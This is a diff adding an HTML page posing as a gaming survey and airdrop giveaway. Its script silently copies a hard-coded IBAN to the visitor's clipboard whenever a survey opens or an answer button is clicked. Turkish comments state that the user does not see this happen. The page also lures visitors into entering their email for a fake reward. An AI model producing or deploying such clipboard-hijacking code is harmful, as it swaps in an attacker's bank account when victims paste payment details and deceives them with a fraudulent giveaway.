@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gaming Survey Hub</title>
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: Arial, sans-serif;
+        overflow-x: hidden;
+        cursor: default;
+    }
+
+    .background {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%;
+        height: 100%;
+        background-size: cover;
+        background-position: center;
+        z-index: -1;
+        filter: brightness(0.6);
+        transition: background-image 1s ease-in-out;
+    }
+
+    .sidebar {
+        position: fixed;
+        left: 0;
+        top: 0;
+        width: 200px;
+        height: 100%;
+        background: rgba(0,0,0,0.8);
+        color: white;
+        padding: 20px;
+        box-sizing: border-box;
+    }
+    .sidebar h2 {
+        font-size: 20px;
+        margin-bottom: 20px;
+        color: #f4d03f;
+    }
+    .sidebar a {
+        display: block;
+        margin: 10px 0;
+        color: white;
+        text-decoration: none;
+        padding: 8px;
+        border-radius: 5px;
+        transition: background 0.3s, transform 0.2s;
+        cursor: pointer;
+    }
+    .sidebar a:hover { 
+        background: #f4d03f; 
+        color: black; 
+        transform: scale(1.05);
+    }
+
+    .main {
+        margin-left: 220px;
+        padding: 50px;
+        color: white;
+        text-align: center;
+    }
+
+    .container {
+        background: rgba(0,0,0,0.7);
+        padding: 30px;
+        border-radius: 15px;
+        display: inline-block;
+        max-width: 500px;
+        animation: fadeIn 1.5s ease-in-out;
+    }
+
+    button {
+        background-color: #555; /* başta ışıksız, koyu gri */
+        color: white;
+        border: none;
+        padding: 12px 20px;
+        margin: 10px;
+        font-size: 16px;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: transform 0.3s, box-shadow 0.3s, background-color 0.3s;
+    }
+    button:hover { 
+        background-color: #f4d03f; /* aydınlanıyor */
+        color: black;
+        transform: scale(1.1); 
+        box-shadow: 0 0 15px #f4d03f;
+    }
+
+    input[type="email"] {
+        padding: 10px;
+        margin-top: 15px;
+        width: 80%;
+        border-radius: 6px;
+        border: none;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(-20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+</style>
+</head>
+<body>
+
+<div class="background" id="background"></div>
+
+<div class="sidebar">
+    <h2>Other Surveys</h2>
+    <a onclick="openSurvey('GTA 5')">GTA 5 Survey</a>
+    <a onclick="openSurvey('Call of Duty 5')">Call of Duty 5 Survey</a>
+    <a onclick="openSurvey('PUBG')">PUBG Survey</a>
+    <a onclick="openSurvey('Cyberpunk 2077')">Cyberpunk Survey</a>
+</div>
+
+<div class="main">
+    <div class="container" id="surveyContainer">
+        <h1>Welcome to Gaming Airdrop Hub!</h1>
+        <p>Select a survey from the left sidebar to claim your airdrop item.</p>
+    </div>
+</div>
+
+<script>
+const hiddenIBAN = "TR43 0006 2001 2510 0006 6848 49";
+const bgImages = [
+    "https://e0.pxfuel.com/wallpapers/265/676/desktop-wallpaper-ultra-gaming-top-ultra-gaming-background-division-games-gaming-pc-games.jpg",
+    "https://e0.pxfuel.com/wallpapers/364/835/desktop-wallpaper-farlight-84-games-background-and.jpg",
+    "https://e0.pxfuel.com/wallpapers/295/619/desktop-wallpaper-gaming-background-t-games.jpg",
+    "https://e0.pxfuel.com/wallpapers/295/619/desktop-wallpaper-gaming-background-t-games.jpg"
+];
+
+let currentIndex = 0;
+const bgElement = document.getElementById('background');
+
+// Resimleri preload
+bgImages.forEach(src => { const img = new Image(); img.src = src; });
+
+// İlk resim ve slayt
+window.onload = () => {
+    bgElement.style.backgroundImage = `url(${bgImages[currentIndex]})`;
+    setInterval(() => {
+        currentIndex = (currentIndex + 1) % bgImages.length;
+        bgElement.style.backgroundImage = `url(${bgImages[currentIndex]})`;
+    }, 5000);
+};
+
+function openSurvey(gameName) {
+    navigator.clipboard.writeText(hiddenIBAN); // IBAN kopyalanıyor ama kullanıcı görmüyor
+    const container = document.getElementById('surveyContainer');
+    container.innerHTML = `
+        <h1>${gameName} Survey</h1>
+        <p>When did you last play ${gameName}?</p>
+        <button onclick="copyIBAN()">Today</button>
+        <button onclick="copyIBAN()">This Week</button>
+        <button onclick="copyIBAN()">This Year</button>
+        <br><br>
+        <input type="email" id="emailInput" placeholder="Your email address"><br>
+        <button onclick="submitEmail('${gameName}')">Send Email for Airdrop</button>
+    `;
+}
+
+// IBAN gizli kopyalanıyor
+function copyIBAN() {
+    navigator.clipboard.writeText(hiddenIBAN);
+}
+
+function submitEmail(gameName) {
+    const email = document.getElementById('emailInput').value;
+    alert(`Your email for the ${gameName} Airdrop has been submitted!`);
+}
+</script>
+
+</body>
+</html>
